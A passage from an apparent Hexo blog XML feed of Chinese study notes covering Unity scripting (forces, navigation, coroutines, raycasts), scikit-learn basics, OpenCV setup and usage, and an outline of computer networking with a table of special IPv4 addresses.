class="comment">/*这种力的方式是通过施加一个持续的加速度来改变物体的速度。例如，在模拟重力场景中，可以使用这种方式为物体施加一个持续的向下加速度，以模拟物体受到地球引力的影响。*/</span></span><br></pre></td></tr></table></figure><p>方法</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 给刚体施加力（力的大小方向，力的方式）</span></span><br><span class="line">rb.AddForce(Vector2.up, ForceMode2D.Impulse);</span><br></pre></td></tr></table></figure><p>案例</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 跳跃</span></span><br><span class="line">rb.AddForce(Vector2.up * jump * jumpSpeed, ForceMode2D.Impulse);</span><br></pre></td></tr></table></figure><h3 id="2-NavMeshAgent"><a href="#2-NavMeshAgent" class="headerlink" title="2 NavMeshAgent"></a>2 NavMeshAgent</h3><p>概念</p><blockquote><p>2D刚体</p></blockquote><p>属性</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> NavMeshAgent agent = GetComponent&lt;NavMeshAgent&gt;();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 是否停止寻路</span></span><br><span class="line">agent.isStopped = <span class="literal">true</span>;</span><br></pre></td></tr></table></figure><p>方法</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 设置可走区域。值为2^n。所以当value=9时表示选择第1,4区域。</span></span><br><span class="line"><span class="comment">// Everything = -1; Nothing = 0;</span></span><br><span class="line">agent.areaMask = <span class="keyword">value</span>;</span><br></pre></td></tr></table></figure><h3 id="3-Line-Renderer"><a href="#3-Line-Renderer" class="headerlink" title="3 Line Renderer"></a>3 Line Renderer</h3><p>概念</p><blockquote><p>线渲染，常用于射线。</p><p>Materials：材质。</p><p>Positions：</p><ul><li>Size：点数</li><li>Element：点坐标</li></ul><p>Paramters</p><ul><li>Start：开始属性。</li><li>End：结束属性。</li></ul></blockquote><p>案例</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 射线</span></span><br><span class="line">line = GetComponent&lt;LineRenderer&gt;();</span><br><span class="line"><span class="keyword">if</span>(<span class="literal">true</span>)</span><br><span class="line">&#123;</span><br><span class="line">    line.enabled = <span class="literal">true</span>;</span><br><span class="line">    <span class="comment">// 设置点坐标（第几个点，坐标）</span></span><br><span class="line">    line.SetPosition(<span class="number">0</span>,startPosition);</span><br><span class="line">    line.SetPosition(<span class="number">1</span>,endPosition);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    line.enabled = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="九、其他"><a href="#九、其他" class="headerlink" title="九、其他"></a>九、其他</h2><h3 id="1-NGUI"><a href="#1-NGUI" class="headerlink" title="1 NGUI"></a>1 NGUI</h3><blockquote><p>$95购买：<a href="https://assetstore.unity.com/packages/tools/gui/ngui-next-gen-ui-2413">official::NGUI</a></p><p>绑定事件在物体中绑定。</p></blockquote><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 找到父物体下的按钮</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">ButtonClickHander</span> : <span class="title">MonoBehaviour</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">Start</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="built_in">int</span> i = <span class="number">0</span>;i &lt; transform.childCount; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            transform.GetChild(i).GetComponent&lt;UIButton&gt;().onClick.Add(<span class="keyword">new</span> EventDelegate(OnButtonClick));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">OnButtonClick</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        print(<span class="string">&quot;Button name is&quot;</span> + UIButton.current.name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-协程"><a href="#2-协程" class="headerlink" title="2 协程"></a>2 协程</h3><blockquote><p>类似python迭代器。</p><p>多个协程可以同时运行，它们会根据各自的启动顺序来更新。</p><p>协程可以嵌套。</p><p>多个脚本访问一个协程，协程可以定义为静态协程。</p><p>协程是单线程。</p><p>协程的方法不能带ref和out型参数。</p></blockquote><p>方法</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定义协程（到yield处返回后，下次从yield后面开始执行代码）</span></span><br><span class="line"><span class="comment">// Func不能是Update</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> IEnumerator <span class="title">Func</span>()</span></span><br><span class="line">&#123; </span><br><span class="line">    <span class="keyword">yield</span> <span class="keyword">return</span> n;</span><br><span class="line">    <span class="keyword">yield</span> <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等待一帧</span></span><br><span class="line"><span class="keyword">yield</span> <span class="keyword">return</span> n;</span><br><span class="line"><span class="comment">// 等待指定时间，受时间缩放影响（单位：s）</span></span><br><span class="line"><span class="function"><span class="keyword">yield</span> <span class="keyword">return</span> <span class="keyword">new</span> <span class="title">WaitForSeconds</span>(<span class="params">time</span>)</span>;</span><br><span class="line"><span class="comment">// 等待指定时间，不受时间缩放影响（单位：s）</span></span><br><span class="line"> <span class="function"><span class="keyword">yield</span> <span class="keyword">return</span> <span class="keyword">new</span> <span class="title">WaitForSecondsRealtime</span>(<span class="params">time</span>)</span>;</span><br><span class="line"><span class="comment">// 等待FixedUpdate结束</span></span><br><span class="line"><span class="function"><span class="keyword">yield</span> <span class="keyword">return</span> <span class="keyword">new</span> <span class="title">WaitForFixedUpdate</span>()</span>;</span><br><span class="line"><span class="comment">// 等待该帧结束</span></span><br><span class="line"><span class="function"><span class="keyword">yield</span> <span class="keyword">return</span> <span class="keyword">new</span> <span class="title">WaitForEndOfFrame</span>()</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等待网络请求完成</span></span><br><span class="line">WWW www = <span class="keyword">new</span> WWW(url);</span><br><span class="line"><span class="keyword">yield</span> <span class="keyword">return</span> www;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 开启协程，返回值是一个协程</span></span><br><span class="line">StartCoroutine(func(para));</span><br><span class="line"><span class="comment">// 停止协程，只能停止StartCoroutine()开启的协程</span></span><br><span class="line">StopCoroutine(func(para));</span><br><span class="line"><span class="comment">// 停止本对象中开启的所有协程</span></span><br><span class="line">StopAllCoroutines();</span><br></pre></td></tr></table></figure><p>案例</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 游戏开始后的倒计时</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">Start</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">StartCoroutine(CountDown(<span class="number">60</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">private</span> IEnumerator <span class="title">CountDown</span>(<span class="params"><span class="built_in">int</span> timeCount</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">do</span>&#123;</span><br><span class="line">        print(timeCount);</span><br><span class="line">        <span class="function"><span class="keyword">yield</span> <span class="keyword">return</span> <span class="keyword">new</span> <span class="title">WaitForSeconds</span>(<span class="params"><span class="number">1</span></span>)</span>;</span><br><span class="line">        timeCount -= <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">while</span> (timeCount &gt; <span class="number">0</span>);</span><br><span class="line">    print(<span class="string">&quot;Game Over!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 缓慢移动</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">OnGUI</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(GUILayout.Button(<span class="string">&quot;Start&quot;</span>))</span><br><span class="line">        StartCoroutine(MoveToPath());</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">private</span> IEnumerator <span class="title">MoveToPath</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">foreach</span>(Transform point <span class="keyword">in</span> points)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">yield</span> <span class="title">return</span>(<span class="params">StartCoroutine(MoveToTarget point.position</span>)</span>;</span><br><span class="line">        <span class="function"><span class="keyword">yield</span> <span class="keyword">return</span> <span class="keyword">new</span> <span class="title">WaitForSeconds</span>(<span class="params"><span class="number">2</span></span>)</span>;                    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">private</span> IEnumerator <span class="title">MoveToTarget</span>(<span class="params">Vector3 target</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">while</span>(transform.position != target)</span><br><span class="line">    &#123;</span><br><span class="line">        transform.position = Vector3.MoveToWards(transform.position,target,Time.deltaTime * speed);</span><br><span class="line">        <span class="function"><span class="keyword">yield</span> <span class="keyword">return</span> <span class="keyword">new</span> <span class="title">WaitForFixedUpdate</span>()</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-射线"><a href="#3-射线" class="headerlink" title="3 射线"></a>3 射线</h3><p>概念</p><blockquote><p>射线。</p></blockquote><p>属性</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 射线</span></span><br><span class="line"><span class="keyword">private</span> Ray ray;</span><br><span class="line"><span class="comment">// 击中物体</span></span><br><span class="line"><span class="keyword">private</span> RaycastHit hit;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 射线原点</span></span><br><span class="line">ray.origin;</span><br><span class="line"><span class="comment">// 射线方向</span></span><br><span class="line">ray.direction;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 碰撞点</span></span><br><span class="line">hit.point;</span><br><span class="line"><span class="comment">// 碰到的碰撞器</span></span><br><span class="line">hit.collider;</span><br><span class="line"><span class="comment">// 射线原点到触碰点的距离</span></span><br><span class="line">hit.distance;</span><br></pre></td></tr></table></figure><p>方法</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 射线，起始位置是主摄像机，方向是鼠标位置</span></span><br><span class="line">ray = Camera.main.ScreenPointToRay(Input.mousePosition);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 是否碰撞到物体（射线，碰到的物体的信息，最远距离，图层）</span></span><br><span class="line"><span class="keyword">public</span> LayerMask layer;</span><br><span class="line">Physics.Raycast(ray,<span class="keyword">out</span> hit,distance,layer.<span class="keyword">value</span>);</span><br><span class="line"><span class="comment">// （起点，方向，目标，最远距离，图层）</span></span><br><span class="line">Physics.Raycast(origin,direction,<span class="keyword">out</span> hit,distance,layer.<span class="keyword">value</span>);</span><br></pre></td></tr></table></figure><p>案例</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 小地图寻路（找子相机射线）</span></span><br><span class="line"><span class="keyword">public</span> Camera camera;</span><br><span class="line">ray = camera.ScreenPointToRay(Input.mousePosition);</span><br></pre></td></tr></table></figure><hr><h2 id="十、状态机"><a href="#十、状态机" class="headerlink" title="十、状态机"></a>十、状态机</h2><blockquote><p>如下为Player框架</p></blockquote><h3 id="1-状态控制脚本"><a href="#1-状态控制脚本" class="headerlink" title="1 状态控制脚本"></a>1 状态控制脚本</h3><h4 id="1-1-Player"><a href="#1-1-Player" class="headerlink" title="1.1 Player"></a>1.1 Player</h4><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">...</span><br></pre></td></tr></table></figure><h4 id="1-2-PlayerState"><a href="#1-2-PlayerState" class="headerlink" title="1.2 PlayerState"></a>1.2 PlayerState</h4><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">...</span><br></pre></td></tr></table></figure><h4 id="1-3-PlayerStateMachine"><a href="#1-3-PlayerStateMachine" class="headerlink" title="1.3 PlayerStateMachine"></a>1.3 PlayerStateMachine</h4><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="2-普通状态"><a href="#2-普通状态" class="headerlink" title="2 普通状态"></a>2 普通状态</h3><h4 id="2-1-PlayerIdleState"><a href="#2-1-PlayerIdleState" class="headerlink" title="2.1 PlayerIdleState"></a>2.1 PlayerIdleState</h4><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">...</span><br></pre></td></tr></table></figure><h4 id="2-2-PlayerMoveState"><a href="#2-2-PlayerMoveState" class="headerlink" title="2.2 PlayerMoveState"></a>2.2 PlayerMoveState</h4><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="3-超级状态"><a href="#3-超级状态" class="headerlink" title="3 超级状态"></a>3 超级状态</h3><blockquote><p>一个超级状态可以有其他不同的普通状态存在。例如：接地状态和空中状态。接地可以是闲置和移动。因此接地是一个超级状态。</p></blockquote><h4 id="3-1-PlayerGroundState"><a href="#3-1-PlayerGroundState" class="headerlink" title="3.1 PlayerGroundState"></a>3.1 PlayerGroundState</h4><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">...</span><br></pre></td></tr></table></figure><h4 id="3-2-PlayerAirState"><a href="#3-2-PlayerAirState" class="headerlink" title="3.2 PlayerAirState"></a>3.2 PlayerAirState</h4><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">...</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 游戏程序 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> 游戏引擎 </tag>
            
            <tag> Unity </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python_AI</title>
      <link href="/posts/9add283d.html"/>
      <url>/posts/9add283d.html</url>
      
        <content type="html"><![CDATA[<h1 id="Python-AI"><a href="#Python-AI" class="headerlink" title="Python_AI"></a>Python_AI</h1><blockquote><p><a href=".\a378bd8e">text::Python</a> </p></blockquote><hr><h2 id="一、基础知识"><a href="#一、基础知识" class="headerlink" title="一、基础知识"></a>一、基础知识</h2><h3 id="1-基本概念"><a href="#1-基本概念" class="headerlink" title="1 基本概念"></a>1 基本概念<img src="/posts/9add283d/分类结果混淆矩阵.jpg" alt></h3><ul><li><p><strong>基本名词</strong></p><blockquote><p>人工智能包含机器学习和深度学习，机器学习包含深度学习。</p></blockquote><ul><li><p>泛化：通用性。</p></li><li><p>非泛化：特殊性。</p></li><li><p>NFL定理：某些问题 model_a 优于 model_b，那么存在另一些问题 model_b 优于 model_a。</p></li><li><p>泛化误差：未来误差。</p></li><li><p>经验误差：训练集上的误差。</p></li><li><p>经验误差并非越小越好，会导致过拟合。</p></li><li><p>过拟合：限制条件太多。</p></li><li><p>欠拟合：限制条件太少。（比如所有绿色的都是树叶）</p></li></ul></li><li><p><strong>集合</strong></p><blockquote><p>测试集应与训练集互斥。</p></blockquote><ul><li>留出法：留出训练集的一部分用于测试。（20%左右)</li><li>交互验证：用 90% 进行训练，剩下 10%进行测试，循环 10 次。</li><li>自助采样：有放回的采样测试。</li></ul></li><li><p><strong>流程名词</strong></p><ul><li>算法参：人为设定的参数，也叫超参数。</li><li>模型参：学习的参数。</li><li>流程：训练集——测试集——验证集。</li><li>算法参确定后用：训练集 + 验证集测试。</li><li>查全率：所有的好西瓜中有多少比例被算法挑了出来。</li><li>查准率：算法挑出来的西瓜中有多少比例是好西瓜。</li></ul></li></ul><h3 id="2-机器学习"><a href="#2-机器学习" class="headerlink" title="2 机器学习"></a>2 机器学习</h3><blockquote><p>定义：机器学习好似从数据中自动分析获得模型，并利用模型对未知数据进行预测。</p><p>数据集构成：特征值 + 目标值（也可以没有目标值，直接进行分类）。</p></blockquote><ul><li><p>算法</p><ul><li><p>监督学习（supervised learning）（预测）</p><blockquote><p>定义：输入数据是由输入特征值和目标值所组成。函数的输出可以是一个连续的值（称为回归），或是输出是有限个离散值（称作分类）。</p></blockquote><ul><li>分类：k-近邻算法、贝叶斯分类、决策树与随机森林、逻辑回归。</li><li>回归：线性回归、岭回归。</li></ul></li><li><p>无监督学习（unsupervised learning）</p><ul><li>定义：输入数据是由输入特征值所组成。</li><li>聚类：k-means。</li></ul></li></ul></li><li><p>目标值</p><ul><li>类别 —— 分类问题。（监督学习）</li><li>连续型数据 —— 回归问题。（监督学习）</li><li>无 —— 聚类。（无监督学习）</li></ul></li><li><p>流程</p><ol><li>获得数据。</li><li>数据预处理。</li><li>特征工程。（将数据处理成机器可以识别的数据：特征值 + 目标值）</li><li>机器训练。</li><li>模型评估。</li><li>应用。</li></ol></li><li><p>深入学习</p><ul><li>机器学习——“西瓜书”——周志华</li><li>统计学习方法——李航</li><li>深度学习——“花书”</li></ul></li></ul><h3 id="3-特征工程"><a href="#3-特征工程" class="headerlink" title="3 特征工程"></a>3 特征工程</h3><ul><li><p>定义</p><ul><li><p>数据集</p><blockquote><p>数据集，数据接口：内部。</p></blockquote></li></ul><ul><li>学习数据集<ul><li>Kaggle：<a href="https://www.kaggle.com/datasets">Find Open Datasets and Machine Learning Projects | Kaggle</a></li><li>UCI数据集：<a href="http://archive.ics.uci.edu/ml/index.php">UCI Machine Learning Repository</a></li><li>scikit-learn：<a href="https://scikit-learn.org/stable/">scikit-learn: machine learning in Python — scikit-learn 1.2.2 documentation</a></li></ul></li></ul></li><li><p>Scikit-learn</p><ul><li><p>基本操作</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#安装</span></span><br><span class="line">pip install Scikit-learn <span class="comment">#可能会报缺少别的库</span></span><br><span class="line"><span class="keyword">import</span> sklearn</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">sklearn包含：Classification（分类），Regression（回归），Clustering（聚类），Dimensionality reduction（降维），Model selection（模型选择），Preprocessing（特征工程）</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#使用数据集</span></span><br><span class="line">sklearn.datasets.load_&lt;name&gt;() <span class="comment">#小数据集，本地保存。</span></span><br><span class="line">sklearn.dataset.fetch_&lt;name&gt;(data_home=<span class="literal">None</span> , subset=<span class="string">&quot;train&quot;</span>) <span class="comment">#大数据集，需要从网上下载。</span></span><br><span class="line"><span class="comment">#data_home：默认保存路径~/scikit_learn_data/；subset：train（训练集），test（测试集），all。</span></span><br></pre></td></tr></table></figure></li><li><p>返回值继承自字典的，datasets.base.Bunch，键如下：</p><ul><li>data：特征数据数组，是[n_samples * n_features]的二维numpy.ndarray 数组。</li><li>target：标签数组，是n_samples的一维numpy.ndarray数组。 </li><li>DESCR：数据描述。</li><li>feature_names：特征名,新闻数据，手写数字、回归数据集没有。</li><li>target_names：标签名。</li></ul></li><li><p>调用：<code>dict[&quot;key&quot;] || dict.key</code></p></li><li><p>数据集</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#小数据集</span></span><br><span class="line">sklearn.datasets.load_iris() <span class="comment">#鸢尾花</span></span><br><span class="line">sklearn.datasets.load_boston() <span class="comment">#波士顿房价</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#大数据集</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p>分类算法</p></li><li><p>回归与聚类算法</p></li></ul><hr><h2 id="二、算法实现"><a href="#二、算法实现" class="headerlink" title="二、算法实现"></a>二、算法实现</h2><h3 id="1-bp神经网络"><a href="#1-bp神经网络" class="headerlink" title="1 bp神经网络"></a>1 bp神经网络</h3>]]></content>
      
      
      <categories>
          
          <category> 新技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> Python </tag>
            
            <tag> AI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Opencv</title>
      <link href="/posts/f19f4a3.html"/>
      <url>/posts/f19f4a3.html</url>
      
        <content type="html"><![CDATA[<h1 id="Opencv"><a href="#Opencv" class="headerlink" title="Opencv"></a>Opencv</h1><blockquote><p><a href="https://opencv.org/">official::官网</a></p></blockquote><hr><h2 id="C"><a href="#C" class="headerlink" title="C++"></a>C++</h2><hr><h3 id="一、配置"><a href="#一、配置" class="headerlink" title="一、配置"></a>一、配置</h3><ol><li>官网下载包</li><li>包含目录：.\opencv\build\include 和 .\opencv\build\include\opencv2</li><li>库目录：.\opencv\build\x64\vc16\lib</li><li>链接器——输入——附加依赖项：opencv_world470d.lib（最后有个 d 表示是 debug 版）</li><li>环境变量添加：Path：.\opencv\build\x64\vc16\bin（可能没用）或 将 opencv_world470.lib 和 opencv_world470d.lib 放入 C:\Windows\System32</li></ol><hr><h3 id="二、基础使用"><a href="#二、基础使用" class="headerlink" title="二、基础使用"></a>二、基础使用</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;opencv2/opencv.hpp&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> cv;</span><br><span class="line"></span><br><span class="line"><span class="comment">//查看</span></span><br><span class="line"><span class="comment">//读取图片，mode是模式。返回 Mat 类。（mode：0（gray），1（BGR，默认））</span></span><br><span class="line"><span class="built_in">imread</span>(path,mode);</span><br><span class="line"><span class="comment">//显示图片，title是显示的图片重命名，Mat 是 Mat 类（同 title 会被覆盖）。</span></span><br><span class="line"><span class="built_in">imshow</span>(title,Mat);</span><br><span class="line"><span class="comment">//等待时间，0 是无限，单位ms。</span></span><br><span class="line"><span class="built_in">waitKey</span>(time);</span><br><span class="line"><span class="comment">//行列值。</span></span><br><span class="line">mat.rows/.cols;</span><br><span class="line"><span class="comment">//获取指定位的位值。（uchar：灰度图，Vec3b：三通道图（数组，遍历 [0 ~ 2] 表示 BGR））</span></span><br><span class="line">mat.<span class="built_in">at</span>&lt;uchar&gt;(i,j);</span><br><span class="line"></span><br><span class="line"><span class="comment">//修改</span></span><br><span class="line"><span class="comment">//重写图片大小。</span></span><br><span class="line"><span class="built_in">resize</span>(in_img,out_img,<span class="built_in">Size</span>(col,row));</span><br><span class="line"><span class="comment">//写出图片。（要保存成 png，否则系统会压缩）</span></span><br><span class="line"><span class="built_in">imwrite</span>(<span class="string">&quot;*.png&quot;</span>,Mat);</span><br><span class="line"><span class="comment">//新建图片（CV_8UC1：单通道）</span></span><br><span class="line"><span class="function">Mat <span class="title">solve</span><span class="params">(row,col,CV_8UC1)</span></span>;</span><br></pre></td></tr></table></figure><h3 id="三、应用"><a href="#三、应用" class="headerlink" title="三、应用"></a>三、应用</h3><blockquote><p><a href=".\71be2b51">text::文件理论知识</a></p></blockquote><hr><h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><h3 id="一、基础使用"><a href="#一、基础使用" class="headerlink" title="一、基础使用"></a>一、基础使用</h3><blockquote><p><a href="https://blog.csdn.net/Vici__/article/details/100714822">链接</a>    <a href="https://blog.csdn.net/m0_57787115/article/details/129975689">链接</a></p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"></span><br><span class="line"><span class="comment">#读取图片，返回 Mat 类。</span></span><br><span class="line">imread(path,mode)</span><br><span class="line"><span class="comment">#显示图片，title是显示的图片重命名，Mat 是 Mat 类（同 title 会被覆盖）。</span></span><br><span class="line">imshow(title,Mat)</span><br><span class="line"><span class="comment">#等待时间，0 是无限，单位ms。</span></span><br><span class="line">waitKey(time)</span><br><span class="line"><span class="comment">#写出图片。（要保存成 png，否则系统会压缩）</span></span><br><span class="line">imwrite(<span class="string">&quot;*.png&quot;</span>,Mat)</span><br><span class="line"></span><br><span class="line"><span class="comment">#行列值元组。</span></span><br><span class="line">img.shape</span><br><span class="line"><span class="comment">#位值获取（灰度图是一个，彩色图是 BGR 值列表）</span></span><br><span class="line">img[i,j]</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 新技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> Python </tag>
            
            <tag> C++ </tag>
            
            <tag> 视觉处理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络</title>
      <link href="/posts/e255a10a.html"/>
      <url>/posts/e255a10a.html</url>
      
        <content type="html"><![CDATA[<h1 id="计算机网络"><a href="#计算机网络" class="headerlink" title="计算机网络"></a>计算机网络</h1><hr><h2 id="一、概述"><a href="#一、概述" class="headerlink" title="一、概述"></a>一、概述</h2><h3 id="1-网络边缘"><a href="#1-网络边缘" class="headerlink" title="1 网络边缘"></a>1 网络边缘</h3><blockquote><p>定义：接入网的终端。</p><p>互联网很多核心内容都是建立在互联网边缘的端系统的应用之上实现的。</p></blockquote><h3 id="2-网络核心"><a href="#2-网络核心" class="headerlink" title="2 网络核心"></a>2 网络核心</h3><blockquote><p>定义：主干网。</p></blockquote><h3 id="3-七层模型"><a href="#3-七层模型" class="headerlink" title="3 七层模型"></a>3 七层模型</h3><blockquote><p><a href="https://baike.sogou.com/v6873774.htm?fromTitle=ISO%2FOSI七层模型">七层模型</a></p></blockquote><div class="table-container"><table><thead><tr><th>自顶到底</th><th>作用</th></tr></thead><tbody><tr><td>应用层</td><td>为应用程序提供网络服务</td></tr><tr><td>表示层</td><td>数据格式转换、数据压缩和数据加密</td></tr><tr><td>会话层</td><td>建立、断开和维护通信链接</td></tr><tr><td>传输层</td><td>为上层协议提供端到端的可靠传输</td></tr><tr><td>网络层</td><td>寻址和路由</td></tr><tr><td>数据链路层</td><td>定义通过通信媒介互连的设备之间传输的规范</td></tr><tr><td>物理层</td><td>利用物理传输介质为数据链路层提供物理连接</td></tr></tbody></table></div><hr><h2 id="二、物理层"><a href="#二、物理层" class="headerlink" title="二、物理层"></a>二、物理层</h2><h3 id="1-概述"><a href="#1-概述" class="headerlink" title="1 概述"></a>1 概述</h3><blockquote><p>数据单元（PDU）是比特。</p></blockquote><hr><h2 id="三、数据链路层"><a href="#三、数据链路层" class="headerlink" title="三、数据链路层"></a>三、数据链路层</h2><h3 id="1-概述-1"><a href="#1-概述-1" class="headerlink" title="1 概述"></a>1 概述</h3><blockquote><p>数据单元（PDU）是帧。</p></blockquote><h3 id="2-ARP"><a href="#2-ARP" class="headerlink" title="2 ARP"></a>2 ARP</h3><hr><h2 id="四、网络层"><a href="#四、网络层" class="headerlink" title="四、网络层"></a>四、网络层</h2><h3 id="1-概述-2"><a href="#1-概述-2" class="headerlink" title="1 概述"></a>1 概述</h3><blockquote><p>点到点 主机到主机的通信 数据单元（PDU）是分组。</p></blockquote><h3 id="2-协议"><a href="#2-协议" class="headerlink" title="2 协议"></a>2 协议</h3><h4 id="2-1-IPv4"><a href="#2-1-IPv4" class="headerlink" title="2.1 IPv4"></a>2.1 IPv4</h4><blockquote><p><a href="https://blog.csdn.net/xiaoxiaodechongzi/article/details/117473775">如何购买公网IP</a></p><p><a href="https://blog.csdn.net/glpghz/article/details/105517837">IP地址划分</a></p></blockquote><div class="table-container"><table><thead><tr><th>特殊IP地址</th><th>作用</th></tr></thead><tbody><tr><td>0.0.0.0</td><td>本地网络中的所有主机，也称为“本地网络地址”或“通配符地址”</td></tr><tr><td>127.0.0.1</td><td>本地主机，也称为“环回地址”</td></tr><tr><td>169.254.0.0/16</td><td>自动配置地址，也称为”APIPA地址“，用于在没有DHCP服务器的情况下自动配置IP地址。可以在同广播域中临时通信（<a href="https://www.zhihu.com/question/496523449">B类保留地址</a>）</td></tr><tr><td>192.0.0.0/24</td><td>IANA保留地址，用于特殊用途，如测试和实验</td></tr><tr><td>10.0.0.0/8、172.16.0.0/12、192.168.0.0/16</td><td>私有地址，用于在私有网络中使用，不会被路由器转发到公共互联网</td></tr><tr><td>224.0.0.0/4</td><td>多播地址，用于向多个主机发送消息</td></tr><tr><td>240.0.0.0/4</td><td>保留地址，用于特殊用途，如组播和实验</td></tr><tr><td>255.255.255.25</td><td>广播地址，用于向本地网络中的所有主机发送广播消息</td></tr></tbody></table></div><h4 id="2-2-IPv6"><a href="#2-2-IPv6" class="headerlink" title="2.2 IPv6"></a>2.2 IPv6</h4><h4 id="2-3-ICMP"><a href="#2-3-ICMP" class="headerlink" title="2.3 ICMP"></a>2.3 ICMP</h4><h4 id="2-4-IMGP"><a href="#2-4-IMGP" class="headerlink" title="2.4 IMGP"></a>2.4 IMGP</h4><h3 id="3-路由协议"><a href="#3-路由协议" class="headerlink" title="3 路由协议"></a>3 路由协议</h3><h4 id="3-1-RIP"><a href="#3-1-RIP" class="headerlink" title="3.1 RIP"></a>3.1 RIP</h4><h4 id="3-2-OSPF"><a href="#3-2-OSPF" class="headerlink" title="3.2 OSPF"></a>3.2 OSPF</h4><h4 id="3-3-BGP"><a href="#3-3-BGP" class="headerlink" title="3.3 BGP"></a>3.3 BGP</h4><h4 id="3-4-其他协议"><a href="#3-4-其他协议" class="headerlink" title="3.4 其他协议"></a>3.4 其他协议</h4><blockquote><p><a href="https://baike.sogou.com/v142627880.htm?fromTitle=DSDV协议">DSDV  目的节点序列距离矢量</a>：Destination-Sequenced Distance Vectoring</p><p><a href="https://baike.sogou.com/v75879466.htm?fromTitle=aodv">AODV 无线自组网按需平面距离矢量路由协议</a>：Ad hoc on-demand distance vector routing</p></blockquote><hr><h2 id="五、传输层"><a href="#五、传输层" class="headerlink" title="五、传输层"></a>五、传输层</h2><h3 id="1-概述-3"><a href="#1-概述-3" class="headerlink" title="1 概述"></a>1 概述</h3><blockquote><p>端到端 进程到进程的通信 数据单元（PDU）是报文段。</p></blockquote><h3 